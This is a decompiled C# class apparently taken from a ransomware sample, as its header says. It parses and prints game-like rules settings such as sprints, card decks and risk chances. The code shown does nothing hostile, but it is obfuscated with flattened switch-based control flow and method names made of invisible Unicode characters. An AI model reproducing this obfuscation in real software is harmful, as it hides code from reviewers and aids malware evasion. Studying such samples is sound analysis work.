// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Rules
// Assembly: ObjRefSurroga, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 1D36518F-5F0C-4DDD-80AA-3BF17FC6E8B1
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-87b4a205c27d8ffaecb7e687ace76ed76394ae98d22a2a8be17f532d917c236e.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Rules
  {
    public int SprintCount { get; private set; }

    public int MaxImpact { get; private set; }

    public Card[] Cards { get; private set; }

    public int InitialResources { get; private set; }

    public int NormalPlanningCount { get; private set; }

    public int NormalPlanningCost { get; private set; }

    public int OverPlanningCost { get; private set; }

    public int SprintsWonWithoutPlanning { get; private set; }

    public float[] RiskChances { get; private set; }

    public bool EconomicsAffectsAll { get; private set; }

    public int StayOnSprintMinDiff { get; private set; }

    public bool OnlyOneWinner { get; private set; }

    private Rules()
    {
label_1:
      int num1 = 1851336816;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 720219933)) % 4U)
        {
          case 0:
            num1 = (int) num2 * 503129653 ^ 889515499;
            continue;
          case 1:
            num1 = (int) num2 * -1985524987 ^ -1907050548;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public static Rules Deserialize(JSONNode json)
    {
      int asInt = json["max-impact"].AsInt;
      return new Rules()
      {
        SprintCount = json["sprints"].AsInt,
        MaxImpact = asInt,
        Cards = Rules.ParseDeck(json["deck"], asInt),
        InitialResources = json["initial-resources"].AsInt,
        NormalPlanningCount = json["normal-planning-count"].AsInt,
        NormalPlanningCost = json["normal-planning-cost"].AsInt,
        OverPlanningCost = json["over-planning-cost"].AsInt,
        SprintsWonWithoutPlanning = json["sprints-won-without-planning"].AsInt,
        RiskChances = Rules.ParseRiskChances(json["risk-chances"]),
        EconomicsAffectsAll = json["economics-affects-all"].AsBool,
        StayOnSprintMinDiff = json["stay-on-sprint-min-diff"].AsInt,
        OnlyOneWinner = json["only-one-winner"].AsBool
      };
    }

    private static float[] ParseRiskChances(JSONNode json)
    {
label_1:
      int num1 = -149457374;
      float[] numArray;
      int aIndex;
      float[] riskChances;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1752718129)) % 7U)
        {
          case 1:
            num1 = (int) num2 * 759664428 ^ -276532901;
            continue;
          case 2:
            int num3;
            num1 = num3 = aIndex < numArray.Length ? -2065490128 : (num3 = -75392381);
            continue;
          case 3:
            riskChances = numArray;
            num1 = (int) num2 * -510885233 ^ -180857874;
            continue;
          case 4:
            numArray[aIndex] = json[aIndex].AsFloat;
            ++aIndex;
            num1 = -1888679905;
            continue;
          case 5:
            numArray = new float[json.Count];
            aIndex = 0;
            num1 = (int) num2 * 1562010617 ^ -89362023;
            continue;
          case 6:
            goto label_1;
          default:
            goto label_8;
        }
      }
label_8:
      return riskChances;
    }

    private static Card[] ParseDeck(JSONNode json, int maxImpact)
    {
      int count = json.Count;
label_1:
      int num1 = -745129531;
      bool flag1;
      int num2;
      int aIndex1;
      JSONNode jsonNode;
      int aIndex2;
      bool flag2;
      List<Card> cardList;
      Card[] array;
      bool flag3;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -697008262)) % 24U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num3 * -709645380 ^ -1427747246;
            continue;
          case 2:
            cardList.Add(new Card()
            {
              Impact = flag3 ? -(maxImpact - aIndex2) : maxImpact * 2 - aIndex2,
              Type = aIndex1
            });
            num1 = -1014232337;
            continue;
          case 3:
            num1 = (int) num3 * 743293077 ^ 307246285;
            continue;
          case 4:
            jsonNode = json[aIndex1];
            num1 = (int) num3 * -50183239 ^ -128818036;
            continue;
          case 5:
            int num4 = flag1 ? 2061231421 : (num4 = 1513472131);
            num1 = num4 ^ (int) num3 * 332319037;
            continue;
          case 6:
            num2 = 0;
            num1 = (int) num3 * -1650835212 ^ -1224416797;
            continue;
          case 7:
            ++aIndex1;
            num1 = (int) num3 * 684572956 ^ -599703975;
            continue;
          case 8:
            flag1 = aIndex2 < maxImpact * 2;
            num1 = -195739577;
            continue;
          case 9:
            ++aIndex2;
            num1 = (int) num3 * 1559114415 ^ 249337029;
            continue;
          case 10:
            aIndex2 = 0;
            num1 = (int) num3 * -920675819 ^ -1993985797;
            continue;
          case 11:
            num1 = -1782832322;
            continue;
          case 12:
            flag3 = aIndex2 < maxImpact;
            num1 = (int) num3 * 2089732070 ^ 941120680;
            continue;
          case 13:
            ++num2;
            num1 = (int) num3 * -1029818617 ^ -302343320;
            continue;
          case 14:
            num1 = (int) num3 * 131824464 ^ -2058892341;
            continue;
          case 15:
            cardList = new List<Card>();
            aIndex1 = 0;
            num1 = (int) num3 * -1762256708 ^ -364746023;
            continue;
          case 16:
            num1 = (int) num3 * 1078052311 ^ -1241813075;
            continue;
          case 17:
            flag2 = num2 < jsonNode[aIndex2].AsInt;
            num1 = -1901700999;
            continue;
          case 18:
            array = cardList.ToArray();
            num1 = (int) num3 * -42592258 ^ -961661273;
            continue;
          case 19:
            int num5 = flag2 ? -675875037 : (num5 = -2127193816);
            num1 = num5 ^ (int) num3 * -1009197228;
            continue;
          case 21:
            num1 = -34748194;
            continue;
          case 22:
            num1 = -2022858140;
            continue;
          case 23:
            int num6;
            num1 = num6 = aIndex1 >= count ? -145095736 : (num6 = -1073614455);
            continue;
          default:
            goto label_25;
        }
      }
label_25:
      return array;
    }

    public override string ToString()
    {
label_1:
      int num1 = 715195297;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 607427373)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            str = Rules.\u202A‪⁫⁯‬‫‮⁬‬⁬‮⁭⁮⁭⁯‍⁮⁮​⁫‪‌‎‌‏‌‭⁬‫​‭⁯⁬‌‍‬‌‬‍‫‮("sprints: {0},\nmax-impact:{1},\ndeck: \n{2},\n\ninitial-resources: {3},\n\nnormal-planning-count: {4},\nnormal-planning-cost: {5},\nover-planning-cost: {6},\nsprints-won-without-planning: {7},\n\nrisk-chances: {8},\n\neconomics-affects-all: {9},\nstay-on-sprint-min-diff: {10},\nonly-one-winner: {11}", new object[12]
            {
              (object) this.SprintCount,
              (object) this.MaxImpact,
              (object) this.CardsToString(),
              (object) this.InitialResources,
              (object) this.NormalPlanningCount,
              (object) this.NormalPlanningCost,
              (object) this.OverPlanningCost,
              (object) this.SprintsWonWithoutPlanning,
              (object) this.RiskChancesToString(),
              (object) this.EconomicsAffectsAll,
              (object) this.StayOnSprintMinDiff,
              (object) this.OnlyOneWinner
            });
            num1 = (int) num2 * 1048553485 ^ 1990529997;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    private string CardsToString()
    {
label_1:
      int num1 = 479118687;
      Card[] cards;
      int index;
      Card card1;
      string str1;
      string str2;
      int num2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 1654714908)) % 16U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num3 * 663121215 ^ -1177353943;
            continue;
          case 2:
            num1 = (int) num3 * -1247581739 ^ -1742119089;
            continue;
          case 3:
            str1 = "[\n\t";
            num1 = (int) num3 * 1010551266 ^ 2011141356;
            continue;
          case 4:
            num2 = card1.Type;
            num1 = (int) num3 * -417648470 ^ 1408732943;
            continue;
          case 5:
            num1 = (int) num3 * 1324083753 ^ 2055686121;
            continue;
          case 6:
            num2 = 0;
            cards = this.Cards;
            num1 = (int) num3 * 1803192976 ^ 1049537283;
            continue;
          case 7:
            int num4 = num2 != card1.Type ? -1620274414 : (num4 = -37672200);
            num1 = num4 ^ (int) num3 * -430249767;
            continue;
          case 8:
            int num5;
            num1 = num5 = index < cards.Length ? 1667815121 : (num5 = 779883472);
            continue;
          case 9:
            ++index;
            num1 = (int) num3 * 1824854088 ^ -1711294916;
            continue;
          case 10:
            str1 = Rules.\u206D‌⁮‌‪‬⁭​‬⁬‬‮‎⁮‫‮‮⁭‏⁯‮⁯‬⁪‭⁮‎⁪‌‪⁫‬‍⁬‬‫‌⁮​‭‮(str1, "\n\t");
            num1 = (int) num3 * -47352513 ^ 2119163678;
            continue;
          case 11:
            string str3 = str1;
            Card card2 = card1;
            string str4 = card2 != null ? Rules.\u206C‫‌‮‪‍‮‭‫⁯⁪⁬⁮‎‭‪‫⁫⁭‮‮⁯‍‍‍⁬‮‪⁪⁫‮⁭‍⁮⁯⁫⁫⁫⁮⁮‮((object) card2) : (string) null;
            str1 = Rules.\u200E‌⁯‏⁪⁮⁭‍⁮‪‭‌⁫​⁬⁫⁫‭⁫‫‌⁭‮⁯‮⁭​⁪⁪‌⁮‮⁫⁯‬‬‪⁫⁮‭‮(str3, str4, " ");
            num1 = 1493546350;
            continue;
          case 12:
            str2 = Rules.\u206D‌⁮‌‪‬⁭​‬⁬‬‮‎⁮‫‮‮⁭‏⁯‮⁯‬⁪‭⁮‎⁪‌‪⁫‬‍⁬‬‫‌⁮​‭‮(str1, "\n]");
            num1 = (int) num3 * 1643576228 ^ 1314355506;
            continue;
          case 13:
            card1 = cards[index];
            num1 = 151549483;
            continue;
          case 15:
            index = 0;
            num1 = (int) num3 * 720312876 ^ 1278121949;
            continue;
          default:
            goto label_17;
        }
      }
label_17:
      return str2;
    }

    private string RiskChancesToString()
    {
      string str1 = Rules.\u206D‌⁮‌‪‬⁭​‬⁬‬‮‎⁮‫‮‮⁭‏⁯‮⁯‬⁪‭⁮‎⁪‌‪⁫‬‍⁬‬‫‌⁮​‭‮("[ ", this.RiskChances[0].ToString((IFormatProvider) Rules.\u206A⁪‏⁯‫‍⁫⁪⁫‫‏⁫‮⁪​⁯‎⁭‮⁫⁯⁬⁭⁯‌⁬‍⁬‮⁯⁫‬⁫‮⁭⁫‍‬⁮⁬‮()));
label_1:
      int num1 = -1223894879;
      int index;
      bool flag;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -917609307)) % 9U)
        {
          case 0:
            flag = index < this.RiskChances.Length;
            num1 = -1972581814;
            continue;
          case 2:
            num1 = (int) num2 * 1656936559 ^ -1056471872;
            continue;
          case 3:
            index = 1;
            num1 = (int) num2 * 2067942190 ^ 712163068;
            continue;
          case 4:
            ++index;
            num1 = (int) num2 * 1821731673 ^ 1691817946;
            continue;
          case 5:
            str2 = Rules.\u206D‌⁮‌‪‬⁭​‬⁬‬‮‎⁮‫‮‮⁭‏⁯‮⁯‬⁪‭⁮‎⁪‌‪⁫‬‍⁬‬‫‌⁮​‭‮(str1, " ]");
            num1 = (int) num2 * -698796185 ^ 1717897753;
            continue;
          case 6:
            goto label_1;
          case 7:
            int num3 = !flag ? -1897145184 : (num3 = -99600819);
            num1 = num3 ^ (int) num2 * -1790451585;
            continue;
          case 8:
            str1 = Rules.\u200E‌⁯‏⁪⁮⁭‍⁮‪‭‌⁫​⁬⁫⁫‭⁫‫‌⁭‮⁯‮⁭​⁪⁪‌⁮‮⁫⁯‬‬‪⁫⁮‭‮(str1, ", ", this.RiskChances[index].ToString((IFormatProvider) Rules.\u206A⁪‏⁯‫‍⁫⁪⁫‫‏⁫‮⁪​⁯‎⁭‮⁫⁯⁬⁭⁯‌⁬‍⁬‮⁯⁫‬⁫‮⁭⁫‍‬⁮⁬‮()));
            num1 = -633602248;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return str2;
    }

    static string \u202A‪⁫⁯‬‫‮⁬‬⁬‮⁭⁮⁭⁯‍⁮⁮​⁫‪‌‎‌‏‌‭⁬‫​‭⁯⁬‌‍‬‌‬‍‫‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static string \u206D‌⁮‌‪‬⁭​‬⁬‬‮‎⁮‫‮‮⁭‏⁯‮⁯‬⁪‭⁮‎⁪‌‪⁫‬‍⁬‬‫‌⁮​‭‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u206C‫‌‮‪‍‮‭‫⁯⁪⁬⁮‎‭‪‫⁫⁭‮‮⁯‍‍‍⁬‮‪⁪⁫‮⁭‍⁮⁯⁫⁫⁫⁮⁮‮([In] object obj0) => obj0.ToString();

    static string \u200E‌⁯‏⁪⁮⁭‍⁮‪‭‌⁫​⁬⁫⁫‭⁫‫‌⁭‮⁯‮⁭​⁪⁪‌⁮‮⁫⁯‬‬‪⁫⁮‭‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static CultureInfo \u206A⁪‏⁯‫‍⁫⁪⁫‫‏⁫‮⁪​⁯‎⁭‮⁫⁯⁬⁭⁯‌⁬‍⁬‮⁯⁫‬⁫‮⁭⁫‍‬⁮⁬‮() => CultureInfo.InvariantCulture;
  }
}
